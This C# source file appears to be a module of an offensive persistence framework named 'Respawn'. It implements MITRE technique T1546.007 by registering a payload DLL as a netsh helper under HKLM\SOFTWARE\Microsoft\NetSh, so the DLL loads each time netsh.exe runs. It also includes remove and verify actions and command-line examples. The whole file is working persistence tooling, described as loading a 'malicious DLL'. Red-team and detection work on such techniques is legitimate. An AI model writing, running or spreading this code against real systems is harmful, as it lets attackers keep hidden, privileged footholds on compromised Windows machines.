using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.NetshHelper
{
    public class NetshHelperModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "netsh";
        public string Name        => "Netsh Helper DLL";
        public string Mitre       => "T1546.007";
        public string Description => "Persist by abusing the Windows Network Shell (netsh.exe) helper mechanism, registering a malicious DLL in the system registry so that it is automatically loaded whenever the network utility is executed.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath = @"SOFTWARE\Microsoft\NetSh";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // 2. DEVELOPER NOTE
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  TECHNICAL REQUIREMENTS:");
            // Console.ResetColor();
            // Console.WriteLine("    - DLL MUST export the 'InitHelperDll' function");
            // // Console.WriteLine("    - Loading occurs during netsh.exe initialization");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Registry value name (e.g. 'NetSvc')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to target DLL (.dll only)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t netsh -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t netsh -a install -n \"NetSvc\" -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t netsh -a verify  -n \"NetSvc\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t netsh -a remove  -n \"NetSvc\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return NetshHelperKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening NetSh registry key. Run as administrator.");

                var existing = regKey.GetValue(ctx.Name);
                if (existing != null)
                    return TechniqueResult.Exists($"Netsh helper '{ctx.Name}' already registered.");

                regKey.SetValue(ctx.Name, ctx.Payload);
                return TechniqueResult.Ok(
                    $"Installed netsh helper '{ctx.Name}' -> '{ctx.Payload}'. " +
                    $"DLL will load into netsh.exe on next execution.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Netsh helper registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening NetSh registry key. Run as administrator.");

                var existing = regKey.GetValue(ctx.Name);
                if (existing == null)
                    return TechniqueResult.NotFound($"Netsh helper '{ctx.Name}' not found.");

                regKey.DeleteValue(ctx.Name);
                return TechniqueResult.Ok($"Removed netsh helper '{ctx.Name}'.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Netsh helper registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening NetSh registry key. Run as administrator.");

                var value = regKey.GetValue(ctx.Name)?.ToString();
                if (value == null)
                    return TechniqueResult.NotFound($"Netsh helper '{ctx.Name}' not found.");

                return TechniqueResult.Ok(
                    $"Verified netsh helper '{ctx.Name}' -> '{value}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Netsh helper registration requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                error = "Netsh helper requires a DLL payload.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}